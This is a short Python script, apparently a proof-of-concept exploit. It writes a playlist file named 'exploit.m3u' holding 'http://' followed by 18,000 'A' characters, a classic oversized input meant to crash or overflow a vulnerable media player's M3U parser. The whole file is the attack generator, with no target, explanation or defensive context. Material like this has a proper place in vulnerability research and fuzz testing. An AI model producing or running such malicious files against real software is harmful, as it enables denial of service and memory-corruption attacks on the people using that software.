#! /usr/bin/python

buffer = "http://"
buffer += "A"*18000


f=open("exploit.m3u","w")
f.write(buffer);
f.close()
